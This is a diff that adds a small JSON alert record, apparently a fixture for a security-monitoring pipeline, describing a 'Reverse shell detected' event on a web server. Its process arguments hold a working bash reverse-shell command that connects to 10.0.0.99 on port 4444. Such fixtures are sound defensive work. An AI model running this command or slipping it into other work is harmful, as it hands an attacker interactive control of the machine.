@@ -1,0 +1,11 @@
+{
+  "alert": {"id": "FX-LNX-REVSHELL", "level": 10, "name": "Reverse shell detected", "timestamp": 1712000600000},
+  "host": {"hostname": "prod-web-01"},
+  "user": {"username": "www-data"},
+  "process": {
+    "pid": 3005,
+    "start_time": 1712000600000,
+    "name": "bash",
+    "args": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
+  }
+}
